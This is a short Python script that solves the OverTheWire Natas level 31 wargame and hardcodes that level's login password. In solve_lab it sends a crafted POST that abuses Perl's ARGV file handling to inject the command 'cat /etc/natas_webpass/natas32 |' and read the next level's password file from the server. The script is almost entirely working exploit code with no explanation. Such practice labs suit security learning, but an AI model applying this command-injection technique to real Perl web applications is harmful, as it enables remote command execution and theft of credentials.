#! /usr/bin/env python

import requests
import re
import base64
import urllib
import string

usn = 'natas31'
url = 'http://%s.natas.labs.overthewire.org' % usn
passwd = 'hay7aecuungiuKaezuathuk9biin0pu1'
login = (usn, passwd)
request = requests.Session()



def get_source_code():
  
  #connection = request.get(url+perl_injection, auth = login)
 
  connection = request.get(url, auth = login,)

 
  print connection.text


def solve_lab():
  connection = requests.post(url + "/index.pl?cat /etc/natas_webpass/natas32 |",
                         files=[("file", ("filename", "bogusFile"))],
                         data={"file": "ARGV"},
                         auth=login)
  #print connection.text

  for x in connection.iter_lines():
      if "<th>" in x:
        print x
  #print connection.request.body   ## To view 
  
